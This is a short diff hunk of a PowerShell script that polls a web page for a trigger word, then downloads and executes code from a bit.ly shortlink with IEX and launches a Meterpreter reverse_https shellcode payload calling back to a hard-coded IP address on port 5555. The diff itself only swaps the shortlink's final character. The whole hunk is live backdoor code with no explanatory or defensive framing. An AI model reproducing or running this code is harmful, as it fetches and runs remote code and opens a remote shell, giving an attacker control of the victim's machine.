@@ -6,7 +6,7 @@ While($True){
 $CommentResult = $WebClientObject.DownloadString($comment)
 $Found = $CommentResult.contains($Word)
 If($Found) {
-IEX $WebClientObject.DownloadString('http://bit.ly/NHpT5c')
+IEX $WebClientObject.DownloadString('http://bit.ly/NHpT5d')
 Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 178.62.116.123 -LPORT 5555 -Force
 Return
 }
